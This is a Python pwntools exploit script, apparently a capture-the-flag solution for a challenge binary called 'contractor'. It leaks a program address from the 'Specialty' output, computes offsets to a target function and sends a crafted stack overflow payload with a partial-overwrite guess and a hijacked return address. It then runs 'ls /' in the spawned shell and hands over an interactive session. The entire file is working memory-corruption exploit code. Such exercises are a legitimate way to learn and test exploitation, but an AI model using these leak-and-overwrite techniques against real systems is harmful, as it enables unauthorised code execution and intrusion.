#!/usr/bin/env python3

from pwn import *

e = ELF("contractor_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            # b* main+179
            b *main+797
            # b *main+1259
            # b *main+1328
            # b* main+927
            # b* main+893
            # b *main+1560
            b *main+1666
            # c
            define hook-stop
            x/10xg 0x7fffffffd798
            end
            """)
    elif cond == 3:
        r = remote("localhost", 12345)

    return r


def main():
    r = conn(1)

    r.sendlineafter(b"What is your name?\n", b"X"*0Xf)
    r.sendlineafter(b"o join me?\n", b"N"*0xff)
    r.sendlineafter(b"our age again?\n", b"1")
    r.sendafter(b"ty in combat?\n", b"C"*0x10)


    r.recvuntil(b"[Specialty]: CCCCCCCCCCCCCCCC")
    output = r.recvline()[:-1][::-1]
    leakAddress = int(output.hex(), 16)
    log.info(f"Leak Address: {hex(leakAddress)}")

    sContract = 0x0000555555555343
    sMain = 0x555555555441
    sLeak = 0x555555555b50
    sSafeBuffer = 0x55555555802c
    offsetSafeBuffer = sSafeBuffer - sLeak
    offsetMain = sMain - sLeak
    offsetSContract = sContract - sLeak

    addrContract = leakAddress + offsetSContract
    addrSafeBuffer = leakAddress + offsetSafeBuffer
    addrMain = leakAddress + offsetMain

    log.info(f"Safe Buffer: {hex(addrSafeBuffer)}")
    log.info(f"Main: {hex(addrMain)}")
    log.info(f"Contract: {hex(addrContract)}")


    r.sendlineafter(b" is true and correct", b"4")


    sRip = 0x7ffdd9559e78
    sBuffer = 0x7ffdd9559e38
    offsetRip =  sRip - sBuffer # no this will zero out an address in the middle of the stack that has our values
    # payload = b"\x00"* offsetRip + b"B"
    # 0x28 until the address that will be put inside of rdx is reached
    payload = b"\x00"* 0x20
    payload += b"\x98" # this will be guessi
    payload += b"\x11"* 0x7
    payload += p64(addrContract)
    r.sendlineafter(b"u good at:", payload)

    sleep(0.5)
    r.sendlineafter(b"correct now", b"Yes")
    r.sendline(b"ls /")
    output = r.recv()
    if output != b"":
        print(output.decode())
        r.sendline(b"ls /")

    output = r.recv()
    if output != b"":
        print(output.decode())
    r.interactive()

if __name__ == "__main__":
    main()